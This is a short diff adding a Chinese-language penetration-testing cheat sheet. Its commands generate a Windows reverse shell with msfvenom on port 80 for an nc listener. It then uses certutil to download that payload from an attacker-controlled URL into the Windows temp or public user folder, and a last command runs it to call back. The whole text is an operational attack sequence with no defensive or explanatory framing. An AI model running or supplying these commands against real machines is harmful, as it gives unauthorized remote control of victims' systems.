@@ -1,0 +1,9 @@
+msf生成nc可接收的80端口的反向shell，建议每次使用先执行第一条命令覆盖原有shell（因为回连ip会变）
+>重新生成反向shell，覆盖原有shell
+msfvenom -p windows/shell_reverse_tcp LHOST=$callback_ip LPORT=80 -f exe -o $toolfile
+>cmd执行下载shell的命令
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>适用于temp目录不可写的时候，往公共用户目录写
+certutil -urlcache -split -f $downloadurl C:\users\public\$badfile
+>cmd执行反向shell
+C:\windows\temp\$badfile
